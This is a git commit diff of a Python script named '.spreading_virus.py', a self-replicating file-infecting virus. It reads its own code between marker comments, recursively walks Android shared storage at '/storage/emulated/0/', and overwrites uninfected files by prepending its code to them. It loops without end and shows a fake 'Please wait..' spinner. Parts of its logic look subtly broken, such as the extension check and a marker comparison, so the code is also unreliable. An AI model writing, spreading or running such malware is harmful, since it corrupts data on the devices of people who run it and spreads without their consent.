6749b2a5e54365c82fbad9e7b454f8abd224c41e
Kitt-loy <63510472+Kitt-loy@users.noreply.github.com>
2023-04-21 14:06:43 +0200

    Update .spreading_virus.py

--- .spreading_virus.py
+++ .spreading_virus.py
@@ -1,40 +1,47 @@
 import os, time, sys, glob
 
+paths = ['/storage/emulated/0/']
+
 while 1:
-	the_code = []
-	with open(sys.argv[0], 'r') as f:
-		lines = f.readlines()
-	self_replicating_part = False
-	for line in lines:
-		if line == "# SAYS HI!":
-			self_replicating_part = True
-		if not self_replicating_part:
-			the_code.append(line)
-		if line == "# SAYS BYE!\n":
-			break
-	python_files = glob.glob('*') + glob.glob('*.txt')
-	for file in python_files:
-	    with open(file, 'r') as f:
-	    	file_code = f.readlines()
-	    infected = False
-	    for line in file_code:
-	    	if line == "# SAYS HI!\n":
-		    	infected = True
-		    	break
-	    if not infected:
-			       final_code = []
-			       final_code.extend(the_code)
-			       final_code.extend('\n')
-			       final_code.extend(file_code)
-			       with open(file, 'w') as f:
-			       	f.writelines(final_code)
-	def countdown():
-	       os.system("clear" or "cls")
-	       print("Please wait.. |")
-	       os.system("clear" or "cls")
-	       print("Please wait.. /")
-	       os.system("clear" or "cls")
-	       print("Please wait.. -")
-	       os.system("clear" or "cls")
-	       print("Please wait.. \ ") 
-	countdown()
+    the_code = []
+    with open(sys.argv[0], 'r') as f:
+        lines = f.readlines()
+    self_replicating_part = False
+    for line in lines:
+        if line == "# SAYS HI!":
+            self_replicating_part = True
+        if not self_replicating_part:
+            the_code.append(line)
+        if line == "# SAYS BYE!\n":
+            break
+    for path in paths:
+        for root, dirs, files in os.walk(path):
+            for name in files:
+                file = os.path.join(root, name)
+                if os.path.exists(file):
+                    _, file_extension = os.path.splitext(file)
+                    if file_extension in ('*'):
+                        with open(file, 'r', encoding='latin-1') as f:
+                            file_code = f.readlines()
+                        infected = False
+                        for line in file_code:
+                            if line == "# SAYS HI!\n":
+                                infected = True
+                                break
+                        if not infected:
+                            final_code = []
+                            final_code.extend(the_code)
+                            final_code.extend('\n')
+                            final_code.extend(file_code)
+                            with open(file, 'w') as f:
+                                f.writelines(final_code)
+    def countdown():
+        os.system("clear" or "cls")
+        print("Please wait.. |")
+        os.system("clear" or "cls")
+        print("Please wait.. /")
+        os.system("clear" or "cls")
+        print("Please wait.. -")
+        os.system("clear" or "cls")
+        print("Please wait.. \ ")
+    countdown()
